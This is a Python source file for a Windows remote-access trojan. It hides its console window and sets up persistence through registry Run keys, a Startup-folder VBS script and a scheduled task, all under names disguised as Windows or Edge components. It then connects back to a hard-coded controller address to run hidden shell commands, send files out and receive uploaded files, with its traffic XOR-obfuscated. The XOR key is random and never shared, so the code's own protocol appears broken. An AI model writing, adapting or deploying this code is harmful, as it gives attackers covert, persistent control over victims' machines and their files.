import ctypes
import socket
import subprocess
import os
import sys
import time
import base64
import threading
import random
import hashlib
import zlib

key_stream = bytearray(os.urandom(32))
for i in range(len(key_stream)):
    key_stream[i] = key_stream[i] ^ 0x77

def xor_encrypt(data):
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ key_stream[i % len(key_stream)]
    return bytes(result)

def xor_decrypt(data):
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ key_stream[i % len(key_stream)]
    return bytes(result)

def compress(data):
    return zlib.compress(data, 9)

def decompress(data):
    return zlib.decompress(data)

def hide_console():
    try:
        ctypes.windll.kernel32.FreeConsole()
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def execute_command(cmd):
    try:
        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            if path == "":
                path = os.path.expanduser("~")
            try:
                os.chdir(path)
                return os.getcwd().encode()
            except:
                return b"cd_error"
        else:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=os.getcwd(), startupinfo=si, creationflags=0x08000000 if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
            stdout_value = proc.stdout.read()
            stderr_value = proc.stderr.read()
            output = stdout_value + stderr_value
            if len(output) == 0:
                return b"exec_ok"
            for enc in ['cp866', 'cp1251', 'utf-8', 'latin1']:
                try:
                    return output.decode(enc).encode()
                except:
                    continue
            return output
    except:
        return b"exec_error"

def set_persistence():
    try:
        import winreg
        script_path = os.path.abspath(sys.argv[0])
        if getattr(sys, 'frozen', False):
            script_path = sys.executable
        key_paths = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        ]
        value_names = ["WindowsDriver", "SystemHelper", "RuntimeBroker", "SvchostHelper"]
        for hkey, subkey in key_paths:
            try:
                key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE)
                for vname in value_names:
                    try:
                        winreg.SetValueEx(key, vname, 0, winreg.REG_SZ, f'"{script_path}"')
                    except:
                        pass
                winreg.CloseKey(key)
            except:
                pass
    except:
        pass
    try:
        startup_dir = os.path.join(os.environ.get('APPDATA', ''), r'Microsoft\Windows\Start Menu\Programs\Startup')
        if os.path.exists(startup_dir):
            with open(os.path.join(startup_dir, "SystemHelper.vbs"), 'w') as f:
                f.write(f'CreateObject("WScript.Shell").Run "{script_path}", 0, False')
    except:
        pass
    try:
        schtasks_cmd = f'schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "{script_path}" /sc onlogon /f /ru "CURRENT_USER"'
        subprocess.call(schtasks_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000 if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
    except:
        pass

def handle_client(host, port):
    delay = 1
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.settimeout(None)
            delay = 1
            while True:
                encrypted_data = sock.recv(8192)
                if not encrypted_data:
                    break
                try:
                    decrypted = xor_decrypt(encrypted_data)
                    decompressed = decompress(decrypted)
                    command = decompressed.decode()
                except:
                    continue
                if command == "terminate":
                    sock.close()
                    sys.exit(0)
                elif command == "heartbeat":
                    response = b"alive"
                elif command.startswith("fetch "):
                    filename = command[6:].strip()
                    try:
                        with open(filename, "rb") as f:
                            file_content = f.read()
                        response = base64.b64encode(file_content)
                    except:
                        response = b"file_not_found"
                elif command.startswith("store "):
                    parts = command[6:].split("|", 1)
                    if len(parts) == 2:
                        filepath = parts[0].strip()
                        filedata = base64.b64decode(parts[1])
                        try:
                            if os.path.dirname(filepath):
                                os.makedirs(os.path.dirname(filepath), exist_ok=True)
                        except:
                            pass
                        with open(filepath, "wb") as f:
                            f.write(filedata)
                        response = b"upload_ok"
                    else:
                        response = b"upload_error"
                elif command == "reinstall":
                    set_persistence()
                    response = b"persist_ok"
                elif command == "getwd":
                    response = os.getcwd().encode()
                else:
                    cmd_result = execute_command(command)
                    response = cmd_result
                try:
                    compressed = compress(response)
                    encrypted = xor_encrypt(compressed)
                    sock.send(encrypted)
                except:
                    pass
            sock.close()
        except:
            time.sleep(delay)
            if delay < 60:
                delay = min(delay * 2, 60)

if __name__ == "__main__":
    try:
        hide_console()
        time.sleep(0.5)
        set_persistence()
        client_thread = threading.Thread(target=handle_client, args=("192.168.100.96", 6767))
        client_thread.daemon = True
        client_thread.start()
        while True:
            time.sleep(60)
    except:
        pass
